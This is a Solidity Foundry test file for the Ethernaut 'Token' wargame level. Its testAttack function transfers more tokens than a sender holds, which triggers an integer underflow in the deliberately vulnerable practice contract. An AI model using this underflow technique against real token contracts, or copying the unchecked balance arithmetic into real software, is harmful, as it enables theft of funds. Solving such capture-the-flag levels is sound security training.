// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_5/Token.sol";

contract EthernautTokenTest is Test {
    Token public token;
    address alice;
    address bob;

    function setUp() public {
        alice = vm.addr(1);
        bob = vm.addr(2);
        vm.startPrank(alice);
        token = new Token(1000);

        token.transfer(bob, 20);
        vm.stopPrank();
    }

    function testAttack() public {
        uint256 aliceBal = token.balanceOf(alice);
        token.transfer(bob, aliceBal + 1);

        token.balanceOf(bob);
    }
}
